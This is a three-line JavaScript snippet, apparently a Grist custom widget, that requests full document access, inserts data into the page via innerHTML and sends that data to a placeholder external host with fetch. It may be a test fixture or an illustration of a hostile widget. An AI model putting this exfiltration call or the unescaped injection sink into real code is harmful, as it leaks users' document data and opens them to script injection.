grist.ready({ requiredAccess: 'full' });
document.getElementById('app').innerHTML = data;
fetch('https://exemple-externe.test/collecte?v=' + data);
